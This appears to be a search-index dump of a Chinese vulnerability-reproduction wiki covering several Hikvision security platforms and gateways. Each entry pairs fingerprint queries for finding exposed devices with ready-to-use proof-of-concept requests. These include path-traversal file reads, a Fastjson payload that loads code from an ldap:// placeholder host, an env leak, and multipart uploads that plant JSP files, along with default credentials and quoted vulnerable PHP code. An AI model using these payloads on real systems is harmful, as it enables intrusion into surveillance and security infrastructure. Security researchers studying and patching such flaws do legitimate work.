","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/:3:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/"},{"categories":null,"content":"漏洞复现 登录页面如下， 默认账号密码为 admin/12345 访问如下URL下载C:/windows/system.ini文件 http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/:4:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/"},{"categories":null,"content":"HIKVISION 综合安防管理平台 applyCT Fastjson远程命令执行漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HIKVISION 综合安防管理平台 applyCT 存在低版本Fastjson远程命令执行漏洞，攻击者通过漏洞可以执行任意命令获取服务器权限 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION 综合安防管理平台 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"HIKVISION-综合安防管理平台\" ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /bic/ssoService/v1/applyCT Content-Type: application/json {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://xxx.xxx.xxx.xxx/Basic/TomcatEcho\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"} ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyct-fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 综合安防管理平台 env 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION 综合安防管理平台 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"HIKVISION-综合安防管理平台\" ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /artemis-portal/artemis/env ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 综合安防管理平台 files 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HiKVISION 综合安防管理平台 files 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HiKVISION 综合安防管理平台 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"HIKVISION-综合安防管理平台\" web.title==\"综合安防管理平台\" ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 需要开放运行管理中心 (8001端口) POST /center/api/files;.html HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip \u003c%out.print(\"test3\");%\u003e ------WebKitFormBoundary9PggsiM755PLa54a-- ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 综合安防管理平台 report 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HiKVISION 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HiKVISION 综合安防管理平台 ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"HIKVISION-综合安防管理平台\" web.title==\"综合安防管理平台\" ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 WEB-INF/classes/com/hikvision/svm/controller/ExternalController.class WEB-INF/classes/com/hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class 构造上传文件（通过 env泄漏获取绝对路径，路径一般不会修改） POST /svm/api/external/report HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip \u003c%out.print(\"test\");%\u003e ------WebKitFormBoundary9PggsiM755PLa54a-- /portal/ui/login/..;/..;/new.jsp ","date":"0001-01-01","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-report-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 联网网关 downdb.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 海康威视 联网网关 在页面 downdb.php 的参数fileName存在任意文件下载漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION 联网网关，流媒体管理服务器 ","date":"0001-01-01","objectID":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"杭州海康威视系统技术有限公司 版权所有\" \u0026\u0026 title==\"联网网关\" ","date":"0001-01-01","objectID":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 默认密码：admin/12345 出现漏洞的代码文件为downdb.php，可以未授权下载任意文件： \u003c?php $file_name=$_GET['fileName']; $file_dir = \"../../../\"; if (!file_exists($file_dir.$file_name)) { //检查文件是否存在 echo'\u003cscript\u003e alert(\"文件不存在!\");window.history.back(-1);\u003c/script\u003e'; exit(); }else{ $file = fopen($file_dir . $file_name,\"r\"); // 打开文件 // 输入文件标签 Header(\"Content-type: application/octet-stream\"); Header(\"Accept-Ranges: bytes\"); Header(\"Accept-Length: \".filesize($file_dir . $file_name)); Header(\"Content-Disposition: attachment; filename=\" . $file_name); // 输出文件内容 echo fread($file,filesize($file_dir.$file_name)); fclose($file); exit(); } ?\u003e POC： /localDomain/downdb.php?fileName=web/html/data/login.php /localDomain/downdb.php?fileName=web/html/localDomain/downdb.php ","date":"0001-01-01","objectID":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3-downdb.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 视频编码设备接入网关 $DATA 任意文件读取 ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:0:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":null,"content":"漏洞描述 HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码 ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:1:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":null,"content":"漏洞影响 HIKVISION 视频编码设备接入网关 ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:2:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":null,"content":"网络测绘 title=\"视频编码设备接入网关\" ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:3:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":null,"content":"漏洞复现 登陆页面 POC /data/login.php::$DATA ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:4:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-data-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":null,"content":"HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 海康威视视频接入网关系统在页面/serverLog/showFile.php的参数fileName存在任意文件下载漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION 视频编码设备接入网关 ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"视频编码设备接入网关\" ","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 漏洞文件为 showFile.php, 其中 参数 fileName 没有过滤危险字符，导致可文件遍历下载 \u003c?php $file_name = $_GET['fileName']; $file_path = '../../../log/'.$file_name; $fp = fopen($file_path, \"r\"); while($line = fgets($fp)){ $line = nl2br(htmlentities($line, ENT_COMPAT, \"utf-8\")); echo '\u003cspan style=\"font-size:16px\"\u003e'.$line.'\u003c/span\u003e'; } fclose($fp); ?\u003e POC /serverLog/showFile.php?fileName=../web/html/main.php 